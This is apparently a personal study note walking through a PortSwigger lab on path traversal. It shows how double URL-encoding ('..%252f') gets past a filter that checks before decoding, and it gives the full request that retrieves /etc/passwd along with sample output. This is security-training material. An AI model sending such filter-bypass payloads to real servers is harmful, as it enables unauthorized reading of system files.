
# #PortSwigger 


![[Pasted image 20251214144042.png]]


## Lab Description

>This lab contains a path traversal vulnerability in the display of product images. The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.
.
>**Objective:** Retrieve the contents of the `/etc/passwd` file.

**The vulnerability:**
- The application blocks `../` sequences **first**
- Then it **URL-decodes** the input
- This order allows bypassing with **double URL-encoding**

**The attack:**
1. Input: `..%252f..%252f..%252fetc/passwd`
2. The application checks for `../` --> **None found** (it sees `%252f` instead of `/`)
3. The application URL-decodes the input --> `../` appears **after** the check    
4. The path becomes `../../../etc/passwd`


---
---


### Step 1: Capture the Image Request

1. In Burp's browser, access the lab
2. Browse to a product page
3. Find an image request in Burp Proxy

**Example request:**
```
GET /image?filename=product1.jpg HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

---

### Step 2: Send to Repeater

Right-click the request --> **Send to Repeater**

---

### Step 3: Modify the Filename

**Original:**
```
GET /image?filename=product1.jpg HTTP/1.1
```

**Modified (double URL-encoded):**
```
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
```

---

### Step 4: Send the Request

1. Click **Send** in Repeater    
2. Observe the response

**Response:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```


![[Pasted image 20251214144248.png]]


---

### Step 5: Lab Solved

![[Pasted image 20251214144305.png]]


---
---

